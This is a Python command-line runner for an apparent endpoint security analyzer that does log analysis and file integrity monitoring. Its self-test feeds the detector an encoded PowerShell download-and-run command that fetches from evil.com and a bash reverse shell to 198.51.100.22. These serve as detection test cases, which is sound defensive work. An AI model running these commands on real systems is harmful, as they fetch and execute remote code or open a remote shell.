"""Standalone CLI Runner for Endpoint Security Capability Module (X3).

Supports process telemetry analysis, File Integrity Monitoring (FIM),
built-in self-testing, and forwarding security findings to SentinelX Ingest API.
"""

from __future__ import annotations

import argparse
import json
import sys
import tempfile
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from modules.endpoint_security.analyzer import EndpointSecurityAnalyzer


def run_self_test() -> int:
    """Executes built-in test suite asserting detection on LOLBAS, reverse shells, and FIM."""
    print("[*] Running EndpointSecurityAnalyzer self-test suite...")
    analyzer = EndpointSecurityAnalyzer()
    failures = 0

    # 1. Benign command line
    benign_cmd = "git status --short"
    f_benign = analyzer.analyze_command_line(benign_cmd, host="workstation-01")
    if f_benign is not None:
        print(f"[-] False positive on legitimate command: {benign_cmd}")
        failures += 1
    else:
        print("  [PASS] Legitimate command line ignored.")

    # 2. Encoded PowerShell (T1059.001)
    ps_cmd = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBzAC4AcABzADEAJwApAA=="
    f_ps = analyzer.analyze_command_line(ps_cmd, host="win-srv01", user="NT AUTHORITY\\SYSTEM")
    if f_ps is None or f_ps.mitre_attack_id != "T1059.001":
        print(f"[-] Failed to detect Encoded PowerShell: {ps_cmd}")
        failures += 1
    else:
        print(f"  [PASS] Detected LOLBAS PowerShell: {f_ps.rule_id} ({f_ps.mitre_attack_id})")

    # 3. Interactive Reverse Shell (T1059.004)
    rev_cmd = "bash -i >&/dev/tcp/198.51.100.22/4444 0>&1"
    f_rev = analyzer.analyze_command_line(rev_cmd, host="linux-prod-db", user="www-data")
    if f_rev is None or f_rev.mitre_attack_id != "T1059.004":
        print(f"[-] Failed to detect Reverse Shell: {rev_cmd}")
        failures += 1
    else:
        print(f"  [PASS] Detected Reverse Shell: {f_rev.rule_id} ({f_rev.mitre_attack_id})")

    # 4. FIM File Modification Test (T1565.001)
    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".conf") as tf:
        tf.write("original_config_content=1\n")
        tf_path = Path(tf.name)

    try:
        analyzer.initialize_fim_baseline([tf_path])
        # Verify no tampering yet
        clean_findings = analyzer.check_file_integrity(host="linux-prod-db")
        if clean_findings:
            print("[-] False positive on unmodified baseline file.")
            failures += 1
        else:
            print("  [PASS] Initial baseline verified unmodified.")

        # Tamper with file
        with open(tf_path, "a", encoding="utf-8") as f:
            f.write("malicious_tamper_line=backdoor\n")

        tamper_findings = analyzer.check_file_integrity(host="linux-prod-db")
        if not tamper_findings or tamper_findings[0].mitre_attack_id != "T1565.001":
            print("[-] Failed to detect FIM file tampering.")
            failures += 1
        else:
            print(f"  [PASS] Detected FIM File Tampering: {tamper_findings[0].rule_id} ({tamper_findings[0].mitre_attack_id})")
    finally:
        if tf_path.exists():
            tf_path.unlink()

    if failures == 0:
        print("[+] EndpointSecurityAnalyzer self-test passed: 4/4 test cases verified.")
        return 0
    else:
        print(f"[-] Self-test failed with {failures} failure(s).")
        return 1


def forward_finding_to_ingest(
    finding_dict: dict[str, Any],
    ingest_url: str,
    api_key: str,
) -> bool:
    """Forwards a normalized Finding as an Endpoint Security Event to SentinelX Ingest API."""
    import httpx

    evidence_obj = finding_dict.get("evidence")
    host = str(finding_dict.get("target") or "unknown-host")

    event_payload = {
        "event_type": "endpoint_finding",
        "source_ip": "127.0.0.1",
        "target_host": host,
        "event_time": finding_dict.get("timestamp") or datetime.now(UTC).isoformat(),
        "details": {
            "finding_id": str(finding_dict.get("finding_id")),
            "tool_name": finding_dict.get("tool_name"),
            "rule_id": finding_dict.get("rule_id"),
            "severity": finding_dict.get("severity"),
            "description": finding_dict.get("description"),
            "mitre_attack_id": finding_dict.get("mitre_attack_id"),
            "evidence": evidence_obj,
        },
    }

    headers = {
        "Content-Type": "application/json",
        "X-API-Key": api_key,
    }

    try:
        res = httpx.post(ingest_url, json=event_payload, headers=headers, timeout=5.0)
        return res.status_code == 201
    except Exception as e:
        print(f"[-] Failed to forward finding to {ingest_url}: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SentinelX Endpoint Security Capability Module (X3)",
    )
    parser.add_argument(
        "--file",
        type=Path,
        help="Path to Auditd or Sysmon JSON log file to analyze",
    )
    parser.add_argument(
        "--fim-init",
        nargs="+",
        help="List of file/directory paths to index into a FIM baseline snapshot",
    )
    parser.add_argument(
        "--fim-scan",
        action="store_true",
        help="Perform FIM integrity scan using baseline snapshot",
    )
    parser.add_argument(
        "--snapshot-file",
        type=Path,
        default=Path("fim_baseline.json"),
        help="Path to FIM baseline snapshot JSON file (default: fim_baseline.json)",
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="Execute built-in self-test suite and exit",
    )
    parser.add_argument(
        "--ingest-url",
        type=str,
        help="SentinelX ingest endpoint URL (e.g. http://localhost:8000/api/v1/events/ingest)",
    )
    parser.add_argument(
        "--api-key",
        type=str,
        default="sen_ingest_demo_key",
        help="Ingestion API key for authentication",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output raw JSON array of findings",
    )

    args = parser.parse_args()

    if args.self_test:
        sys.exit(run_self_test())

    analyzer = EndpointSecurityAnalyzer()

    # Handle FIM initialization
    if args.fim_init:
        print(f"[*] Initializing FIM baseline for {len(args.fim_init)} path(s)...")
        count = analyzer.initialize_fim_baseline(args.fim_init)
        analyzer.export_baseline_snapshot(args.snapshot_file)
        print(f"[+] Baseline snapshot saved to {args.snapshot_file} ({count} files indexed).")
        sys.exit(0)

    all_findings = []

    # Handle FIM scan
    if args.fim_scan:
        if not args.snapshot_file.exists():
            print(f"[-] Error: Baseline snapshot file not found: {args.snapshot_file}", file=sys.stderr)
            sys.exit(1)
        analyzer.import_baseline_snapshot(args.snapshot_file)
        print(f"[*] Running FIM scan across {len(analyzer.fim_baseline)} monitored files...")
        fim_findings = analyzer.check_file_integrity()
        all_findings.extend(fim_findings)

    # Handle log file analysis
    if args.file:
        if not args.file.exists():
            print(f"[-] Error: log file not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        with open(args.file, encoding="utf-8") as f:
            for line in f:
                f_res = analyzer.parse_log_line(line)
                if f_res:
                    all_findings.append(f_res)

    if not args.file and not args.fim_scan:
        parser.print_help()
        sys.exit(1)

    # Format findings output
    findings_dicts = [f.model_dump(mode="json") for f in all_findings]

    if args.json:
        print(json.dumps(findings_dicts, indent=2))
    else:
        print("\n========================================================")
        print(f" SentinelX Endpoint Security Analyzer - Findings ({len(all_findings)})")
        print("========================================================")
        for idx, f in enumerate(all_findings, 1):
            print(f"\n[{idx}] [{f.severity.value.upper()}] {f.rule_id}: {f.description}")
            print(f"    MITRE ATT&CK : {f.mitre_attack_id or 'N/A'}")
            print(f"    Target       : {f.target}")
            if isinstance(f.evidence, dict):
                print("    Evidence     :")
                for k, v in f.evidence.items():
                    print(f"      * {k}: {v}")
            elif f.evidence:
                print(f"    Evidence     : {f.evidence}")

    # Forward to SentinelX Ingestion API if requested
    if args.ingest_url and findings_dicts:
        print(f"\n[*] Forwarding {len(findings_dicts)} findings to {args.ingest_url}...")
        forwarded = sum(
            forward_finding_to_ingest(f, args.ingest_url, args.api_key)
            for f in findings_dicts
        )
        print(f"[+] Successfully ingested {forwarded}/{len(findings_dicts)} findings.")


if __name__ == "__main__":
    main()
